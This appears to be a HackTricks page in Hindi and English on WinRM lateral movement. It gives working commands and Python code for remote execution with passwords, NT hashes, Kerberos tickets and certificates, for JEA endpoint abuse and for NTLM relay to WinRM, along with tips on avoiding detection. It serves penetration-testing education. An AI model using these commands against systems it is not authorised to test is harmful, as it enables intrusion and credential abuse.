# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM Windows environments में सबसे सुविधाजनक **lateral movement** transports में से एक है, क्योंकि यह SMB service creation tricks की आवश्यकता के बिना **WS-Man/HTTP(S)** पर remote shell देता है। यदि target **5985/5986** expose करता है और आपके principal को remoting की अनुमति है, तो आप अक्सर "valid creds" से "interactive shell" तक बहुत जल्दी पहुंच सकते हैं।

**protocol/service enumeration**, listeners, WinRM enabling, `Invoke-Command`, और generic client usage के लिए देखें:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operators को WinRM क्यों पसंद है

- यह SMB/RPC के बजाय **HTTP/HTTPS** का उपयोग करता है, इसलिए यह अक्सर उन जगहों पर काम करता है जहां PsExec-style execution blocked होता है।
- **Kerberos** के साथ, reusable credentials target को भेजने से बचते हैं।
- यह **Windows**, **Linux**, और Python tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) से आसानी से काम करता है।
- Interactive PowerShell remoting path authenticated user context के अंतर्गत target पर **`wsmprovhost.exe`** spawn करता है, जो service-based exec से operational रूप से अलग है।

## Access model और prerequisites

व्यवहार में, सफल WinRM lateral movement तीन चीजों पर निर्भर करता है:

1. Target पर **WinRM listener** (`5985`/`5986`) मौजूद हो और firewall rules access की अनुमति दें।
2. Account endpoint पर **authenticate** कर सके।
3. Account को **remoting session खोलने** की अनुमति हो।

यह access प्राप्त करने के सामान्य तरीके:

- Target पर **Local Administrator** होना।
- नए systems पर **Remote Management Users** की membership या उन systems/components पर **WinRMRemoteWMIUsers__** की membership जो अभी भी उस group को honor करते हैं।
- Local security descriptors / PowerShell remoting ACL changes के माध्यम से delegated explicit remoting rights।

यदि आप पहले से admin rights वाले box को control करते हैं, तो याद रखें कि यहां बताई गई techniques का उपयोग करके आप full admin group membership के बिना भी **WinRM access delegate** कर सकते हैं:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement के दौरान महत्वपूर्ण authentication gotchas

- **Kerberos के लिए hostname/FQDN आवश्यक है**। यदि आप IP से connect करते हैं, तो client आमतौर पर **NTLM/Negotiate** पर fallback करता है।
- **Workgroup** या cross-trust edge cases में, NTLM को आमतौर पर **HTTPS** या client पर target को **TrustedHosts** में add करने की आवश्यकता होती है।
- Workgroup में Negotiate के माध्यम से **local accounts** के साथ, UAC remote restrictions access को रोक सकती हैं, जब तक built-in Administrator account का उपयोग न किया जाए या `LocalAccountTokenFilterPolicy=1` सेट न हो।
- PowerShell remoting default रूप से **`HTTP/<host>` SPN** का उपयोग करता है। जिन environments में **`HTTP/<host>`** पहले से किसी अन्य service account पर registered है, वहां WinRM Kerberos `0x80090322` के साथ fail हो सकता है; port-qualified SPN का उपयोग करें या **`WSMAN/<host>`** पर switch करें, जहां वह SPN मौजूद हो।<sup>[[3]](#references)</sup>

यदि password spraying के दौरान आपको valid credentials मिलते हैं, तो उन्हें WinRM पर validate करना अक्सर यह जांचने का सबसे तेज तरीका होता है कि वे shell में बदल सकते हैं या नहीं:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### Validation और one-shot execution के लिए NetExec / CrackMapExec
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Interactive shells के लिए Evil-WinRM

`evil-winrm` Linux से सबसे सुविधाजनक interactive option बना हुआ है क्योंकि यह **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer और in-memory PowerShell/.NET loading को support करता है।
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN की विशेष स्थिति: `HTTP` बनाम `WSMAN`

जब default **`HTTP/<host>`** SPN के कारण Kerberos failures हों, तो इसके बजाय **`WSMAN/<host>`** ticket request/use करने का प्रयास करें। यह hardened या असामान्य enterprise setups में दिखाई देता है, जहाँ **`HTTP/<host>`** पहले से ही किसी अन्य service account से जुड़ा होता है।<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
यह तब भी उपयोगी है जब **RBCD / S4U** abuse के बाद आपने विशेष रूप से generic `HTTP` ticket के बजाय **WSMAN** service ticket forge या request किया हो।

### Certificate-based authentication

WinRM **client certificate authentication** को भी support करता है, लेकिन certificate को target पर किसी **local account** से map किया जाना आवश्यक है। Offensive perspective से यह तब महत्वपूर्ण होता है जब:

- आपने WinRM के लिए पहले से mapped कोई valid client certificate और private key चुराई या export की हो;
- आपने **AD CS / Pass-the-Certificate** का abuse करके किसी principal के लिए certificate प्राप्त किया हो और फिर किसी अन्य authentication path में pivot किया हो;
- आप ऐसे environments में काम कर रहे हों जो जानबूझकर password-based remoting से बचते हों।
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM, password/hash/Kerberos auth की तुलना में बहुत कम common है, लेकिन जब यह उपलब्ध होता है, तो यह ऐसा **passwordless lateral movement** path प्रदान कर सकता है जो password rotation के बाद भी बना रहता है।

### Python / `pypsrp` के साथ automation

यदि आपको operator shell के बजाय automation की आवश्यकता है, तो `pypsrp` Python से WinRM/PSRP उपलब्ध कराता है और इसमें **NTLM**, **certificate auth**, **Kerberos** तथा **CredSSP** का support है।<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
यदि आपको high-level `Client` wrapper की तुलना में अधिक सूक्ष्म नियंत्रण चाहिए, तो निम्न-स्तरीय `WSMan` + `RunspacePool` APIs दो सामान्य operator समस्याओं के लिए उपयोगी हैं:

- default `HTTP` expectation के बजाय Kerberos service/SPN के रूप में **`WSMAN`** को force करना, जिसका उपयोग कई PowerShell clients करते हैं;
- **JEA** / custom session configuration जैसे **non-default PSRP endpoint** से connect करना, `Microsoft.PowerShell` के बजाय।
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### lateral movement के दौरान Custom PSRP endpoints और JEA महत्वपूर्ण हैं

सफल WinRM authentication का यह अर्थ **हमेशा** नहीं होता कि आपको default unrestricted `Microsoft.PowerShell` endpoint में access मिलता है। Mature environments अपने ACLs और run-as behavior वाले **custom session configurations** या **JEA** endpoints expose कर सकते हैं।<sup>[[1]](#references)</sup>

यदि आपके पास पहले से किसी Windows host पर code execution है और आप यह समझना चाहते हैं कि कौन-से remoting surfaces मौजूद हैं, तो registered endpoints enumerate करें:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
जब कोई उपयोगी endpoint मौजूद हो, तो default shell के बजाय उसे स्पष्ट रूप से target करें:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
व्यावहारिक offensive implications:

- एक **restricted** endpoint lateral movement के लिए फिर भी पर्याप्त हो सकता है, यदि वह service control, file access, process creation या arbitrary .NET / external command execution के लिए केवल सही cmdlets/functions को expose करता हो।
- एक **misconfigured JEA** role विशेष रूप से मूल्यवान होता है, जब वह `Start-Process`, broad wildcards, writable providers या custom proxy functions जैसे खतरनाक commands को expose करता है, जो आपको इच्छित restrictions से बाहर निकलने देते हैं।
- **RunAs virtual accounts** या **gMSAs** द्वारा समर्थित endpoints आपके द्वारा run किए जाने वाले commands के effective security context को बदल देते हैं। विशेष रूप से, gMSA-backed endpoint **second hop** पर **network identity** प्रदान कर सकता है, भले ही normal WinRM session classic delegation problem का सामना करे।

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` built in है और तब उपयोगी है जब आप interactive PowerShell remoting session खोले बिना **native WinRM command execution** चाहते हैं:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
दो flags को आसानी से भुलाया जा सकता है और ये व्यवहार में महत्वपूर्ण हैं:

- `/noprofile` अक्सर तब आवश्यक होता है जब remote principal **local administrator** न हो।
- `/allowdelegate` remote shell को **third host** के विरुद्ध आपके credentials का उपयोग करने में सक्षम बनाता है (उदाहरण के लिए, जब command को `\\fileserver\share` की आवश्यकता हो)।
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
व्यवहार में, `winrs.exe` से आमतौर पर निम्न के समान एक remote process chain बनती है:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
यह याद रखना उपयोगी है क्योंकि यह service-based exec और interactive PSRP sessions से अलग है।

### `winrm.cmd` / WS-Man COM, PowerShell remoting के बजाय

आप `Enter-PSSession` के बिना भी **WinRM transport** के माध्यम से WS-Man पर WMI classes invoke करके execute कर सकते हैं। इससे transport WinRM ही रहता है, जबकि remote execution primitive **WMI `Win32_Process.Create`** बन जाता है:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
यह approach तब उपयोगी है जब:

- PowerShell logging की कड़ी निगरानी की जाती हो।
- आप **WinRM transport** चाहते हों, लेकिन classic PS remoting workflow नहीं।
- आप **`WSMan.Automation`** COM object के आसपास custom tooling बना या उपयोग कर रहे हों।

## NTLM relay to WinRM (WS-Man)

जब SMB relay signing के कारण blocked हो और LDAP relay constrained हो, तब **WS-Man/WinRM** अभी भी एक आकर्षक relay target हो सकता है। आधुनिक `ntlmrelayx.py` में **WinRM relay servers** शामिल हैं और यह **`wsman://`** या **`winrms://`** targets पर relay कर सकता है।
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
दो व्यावहारिक नोट्स:

- Relay तब सबसे अधिक उपयोगी होता है जब target **NTLM** स्वीकार करता हो और relayed principal को WinRM उपयोग करने की अनुमति हो।
- हाल का Impacket code विशेष रूप से **`WSMANIDENTIFY: unauthenticated`** requests को संभालता है, इसलिए `Test-WSMan`-style probes relay flow को बाधित नहीं करते।

पहला WinRM session प्राप्त करने के बाद multi-hop constraints के लिए देखें:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC और detection संबंधी नोट्स

- **Interactive PowerShell remoting** आमतौर पर target पर **`wsmprovhost.exe`** बनाता है।
- **`winrs.exe`** सामान्यतः **`winrshost.exe`** और उसके बाद अनुरोधित child process बनाता है।
- Custom **JEA** endpoints actions को **`WinRM_VA_*`** virtual accounts या configured **gMSA** के रूप में execute कर सकते हैं, जिससे सामान्य user-context shell की तुलना में telemetry और second-hop behavior दोनों बदल जाते हैं।<sup>[[1]](#references)</sup>
- यदि आप raw **`cmd.exe`** के बजाय PSRP का उपयोग करते हैं, तो **network logon** telemetry, WinRM service events और PowerShell operational/script-block logging की अपेक्षा करें।
- यदि आपको केवल एक command चलानी है, तो लंबी अवधि वाले interactive remoting session की तुलना में `winrs.exe` या one-shot WinRM execution कम शोर वाला हो सकता है।
- यदि Kerberos उपलब्ध है, तो trust issues और client-side `TrustedHosts` में असुविधाजनक बदलावों को कम करने के लिए IP + NTLM के बजाय **FQDN + Kerberos** को प्राथमिकता दें।

## References

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
